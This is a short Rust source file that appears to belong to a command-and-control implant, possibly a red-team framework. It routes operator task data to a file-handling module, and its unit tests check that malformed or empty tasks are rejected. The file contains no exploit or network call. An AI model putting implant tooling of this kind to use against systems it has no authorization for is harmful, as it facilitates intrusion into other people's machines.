//! File task execution
//!
//! Enabled via the `mod-file` feature flag.

use crate::error::ImplantResult;
use common::{Module, TaskId};

/// Execute a file task using mod-file
pub fn execute_file(task_data: &[u8]) -> ImplantResult<Vec<u8>> {
    let module = mod_file::FileModule::new();
    let task_id = TaskId::new();

    let result = module
        .handle(task_id, task_data)
        .map_err(|e| crate::error::ImplantError::Task(e.to_string()))?;

    // Serialize the TaskResult to bytes (JSON for now, could be protobuf later)
    let result_bytes =
        serde_json::to_vec(&result).map_err(|e| crate::error::ImplantError::Task(e.to_string()))?;

    Ok(result_bytes)
}

#[cfg(test)]
#[cfg(feature = "mod-file")]
mod tests {
    use super::*;

    /// Test that invalid/malformed task data returns an error
    #[test]
    fn test_execute_file_invalid_task_data() {
        // Garbage bytes that won't decode as valid protobuf
        let invalid_data = vec![0xFF, 0xFE, 0xFD, 0xFC, 0xFB];

        let result = execute_file(&invalid_data);
        assert!(result.is_err(), "invalid task data should return error");

        let err = result.unwrap_err();
        assert!(
            err.to_string().to_lowercase().contains("task")
                || err.to_string().to_lowercase().contains("decode")
                || err.to_string().to_lowercase().contains("error"),
            "error should mention task/decode issue: {}",
            err
        );
    }

    /// Test that empty task data returns an error (no valid operation)
    #[test]
    fn test_execute_file_empty_task_data() {
        let empty_data: Vec<u8> = vec![];

        let result = execute_file(&empty_data);
        // Empty protobuf decodes to default struct with no operation set
        // The module should reject this
        assert!(
            result.is_err(),
            "empty task data should return error (no operation)"
        );
    }
}
